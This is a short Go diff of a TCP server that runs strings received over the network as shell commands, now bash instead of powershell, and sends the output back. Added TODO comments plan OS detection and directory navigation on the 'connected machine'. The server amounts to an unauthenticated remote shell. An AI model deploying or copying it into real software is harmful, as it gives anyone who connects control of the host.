@@ -14,6 +14,18 @@ const (
 	CONN_TYPE = "tcp"
 )
 
+// TODO this should be called "server" because things are connecting to it!
+
+// func whatOS() add method to determin what OS is running on the connected machine
+
+// add windows specific functions
+
+// add linux specific functions
+// - utilizing things like pwd, "..", and absolute/relative paths
+//   to make our lives easier when we use "cd ..", or "cd [relative file path]"
+
+// add a print formatter if there is not one already made online
+
 func main() {
 	// Listen for incoming connections.
 	l, err := net.Listen(CONN_TYPE, CONN_HOST+":"+CONN_PORT)
@@ -63,9 +75,9 @@ func handleRequest(conn net.Conn) {
 		wd, _ := os.Getwd()
 		conn.Write([]byte("directory changed to " + wd))
 	} else {
-		cmd := exec.Command("powershell", bufString)
-		output, err := cmd.CombinedOutput()
-		if err != nil {
+		cmd := exec.Command("bash", bufString) // powershell or bash depending on linux or windows.
+		output, err := cmd.CombinedOutput()    // TODO use the function whatOS(), to determine what string
+		if err != nil {                        // to place inside s1 in exec.Command(s1, s2).
 			fmt.Println(fmt.Sprint(err) + ": " + string(output))
 			conn.Write([]byte("error"))
 			return
